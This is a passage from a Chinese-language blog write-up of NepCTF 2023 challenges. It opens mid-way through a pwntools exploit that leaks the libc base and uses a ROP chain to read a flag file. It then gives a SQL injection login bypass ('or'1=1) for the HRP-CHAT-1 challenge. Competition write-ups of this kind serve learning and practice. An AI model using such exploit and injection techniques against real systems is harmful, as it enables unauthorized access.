</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>pl</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span><span class=o>=</span><span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span><span class=o>-</span><span class=p>(</span><span class=mh>0x7fc5f80ea520</span><span class=o>-</span><span class=mh>0x7fc5f7fcf000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s2>&#34;libc_base&#34;</span><span class=p>,</span><span class=n>libc_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rdx</span><span class=o>=</span><span class=n>libc_os</span><span class=p>(</span><span class=mh>0x0000000000001b96</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rcx</span><span class=o>=</span><span class=n>libc_os</span><span class=p>(</span><span class=mh>0x000000000010c423</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pl</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;./flag</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x30</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pl</span><span class=o>+=</span><span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>rdi</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=n>rsi_r15</span><span class=p>,</span><span class=n>bss</span><span class=o>-</span><span class=mh>0x30</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>rdx</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>sys_plt</span><span class=p>,</span><span class=n>rdi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>rsi_r15</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>rdx</span><span class=p>,</span><span class=n>bss</span><span class=o>-</span><span class=mh>0x80</span><span class=p>,</span><span class=n>rcx</span><span class=p>,</span><span class=mh>0x50</span><span class=p>,</span><span class=n>sys_plt</span><span class=p>,</span><span class=n>rdi</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>rsi_r15</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>rdx</span><span class=p>,</span><span class=n>bss</span><span class=o>-</span><span class=mh>0x80</span><span class=p>,</span><span class=n>rcx</span><span class=p>,</span><span class=mh>0x50</span><span class=p>,</span><span class=n>sys_plt</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>pl</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>           
</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152353.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152353.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152353.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152353.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152353.png title=img></p><h3 id=hrp-chat-1>HRP-CHAT-1</h3><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152354.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152354.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152354.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152354.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152354.png title=img></p><p>存在sql注入，拼接字符串绕过检测</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Login
</span></span><span class=line><span class=cl>a
</span></span><span class=line><span class=cl>b
</span></span><span class=line><span class=cl>Login
</span></span><span class=line><span class=cl>a<span class=s1>&#39;or&#39;</span><span class=nv>1</span>
</span></span><span class=line><span class=cl><span class=o>=</span><span class=m>1</span>
</span></span></code></pre></div><p>登录成功后进商店999买flag</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152355.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152355.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152355.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152355.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152355.png title=img></p><h3 id=hrp-chat-3>HRP-CHAT-3</h3><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152356.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152356.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152356.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152356.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152356.png title=img></p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152357.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152357.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152357.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152357.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152357.png title=img></p><p>抽出H3h3QAQ，查看在Message中位置（第一个为0），战斗</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152358.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152358.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152358.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152358.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152358.png title=img></p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152359.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152359.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152359.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152359.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152359.png title=img></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2024-04-23</span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/nepctf2023/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://githubmof.github.io/nepctf2023/ data-title=NepCTF2023 data-hashtags=ctf><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://githubmof.github.io/nepctf2023/ data-hashtag=ctf><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/ctf/>ctf</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/%E8%93%9D%E5%B8%BD%E6%9D%AF2023/ class=prev rel=prev title=蓝帽杯2023><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>蓝帽杯2023</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><span id=run-time></span></div><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2021 - 2024</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://github.com/githubmof target=_blank>mof</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><div class=sidebar_wo><div id=leimu><img src=/images/sidebar_wo/leimuA.png alt=雷姆 onmouseover=/images/sidebar_wo/leimuB.png onmouseout=/images/sidebar_wo/leimuA.png title=回到顶部></div><div class=sidebar_wo id=lamu><img src=/images/sidebar_wo/lamuA.png alt=雷姆 onmouseover=/images/sidebar_wo/lamuB.png onmouseout=/images/sidebar_wo/lamuA.png title=回到底部></div></div><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/contrib/auto-render.min.js></script><script type=text/javascript src=/lib/katex/contrib/copy-tex.min.js></script><script type=text/javascript src=/lib/katex/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1}}</script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js></script>
<script type=text/javascript src=https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js></script><script type=text/javascript src=/js/custom.js></script></body></html>